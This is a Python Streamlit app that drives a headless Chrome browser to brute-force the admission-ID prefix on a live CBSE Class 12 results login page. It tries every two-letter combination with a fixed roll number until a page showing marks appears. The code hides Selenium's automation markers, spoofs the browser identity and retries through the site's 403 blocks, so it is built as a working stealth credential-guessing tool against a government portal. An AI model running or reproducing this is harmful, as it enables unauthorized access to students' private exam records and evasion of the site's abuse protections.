import streamlit as st
import os, time, string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1280,1024")
    
    # 1. SPOOF USER-AGENT: Makes Chrome look like a real Windows 10 user
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    options.add_argument(f"user-agent={ua}")
    
    # 2. STEALTH SETTINGS: Hide the fact that this is Selenium
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("--disable-blink-features=AutomationControlled")
    
    # Render Binary Path
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        options.binary_location = render_bin
    
    driver = webdriver.Chrome(options=options)
    
    # 3. JAVASCRIPT STEALTH: Remove the 'webdriver' property from the browser
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": """
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            })
        """
    })
    
    return driver

def check_for_success(driver):
    try:
        page_source = driver.page_source.lower()
        success_keys = ["marks", "statement", "subject", "total", "grade", "pass"]
        if any(key in page_source for key in success_keys):
            return True, "Success Detected"
        if len(driver.find_elements(By.ID, "rroll")) == 0:
            return True, "Redirected (Login gone)"
        err_msg = driver.find_elements(By.ID, "err_msg")
        if err_msg and err_msg[0].is_displayed():
            if "no data" in err_msg[0].text.lower():
                return False, "Fail: No data found"
    except: pass
    return False, "Still on Login"

# ========================= UI =========================
st.set_page_config(page_title="Stealth Debugger", layout="wide")
st.title("🕵️ CBSE Stealth Recovery")

col1, col2 = st.columns([1, 2])
with col1:
    roll_val = st.text_input("Roll Number", "18615899")
    suffix_val = st.text_input("Suffix", "994511")
    delay = st.slider("Wait Time (sec)", 1.0, 5.0, 2.0)
    start_btn = st.button("🚀 Run Stealth Search")

with col2:
    st.subheader("Live Stealth View")
    log_window = st.container(border=True)
    debug_image = st.empty()

if start_btn:
    driver = None
    try:
        log_window.write("⏳ Initializing Stealth Driver...")
        driver = get_driver()
        
        letters = string.ascii_uppercase
        combos = [f"{a}{b}" for a in letters for b in letters]
        
        for i, prefix in enumerate(combos):
            full_id = f"{prefix}{suffix_val}"
            
            # Action: Navigate
            driver.get(URL)
            
            try:
                # Use a longer wait for initial load to bypass 403 checks
                wait = WebDriverWait(driver, 15)
                roll_in = wait.until(EC.presence_of_element_located((By.ID, "rroll")))
                
                roll_in.send_keys(roll_val)
                driver.find_element(By.ID, "admn_id").send_keys(full_id)
                driver.find_element(By.ID, "submit").click()
                
                time.sleep(delay)
                
                # Show screenshot
                debug_image.image(driver.get_screenshot_as_png(), caption=f"Testing {full_id}")
                
                is_hit, reason = check_for_success(driver)
                if is_hit:
                    log_window.success(f"💎 MATCH: {full_id}")
                    st.balloons()
                    break
                
            except Exception as e:
                # Capture the 403 or Error page
                debug_image.image(driver.get_screenshot_as_png(), caption="Blocked/Error Screen")
                log_window.error(f"❌ Attempt {full_id} failed. Site may be blocking.")
                time.sleep(5) # Slow down if blocked to avoid permanent IP ban
                continue

    except Exception as e:
        st.error(f"System Error: {e}")
    finally:
        if driver:
            driver.quit()
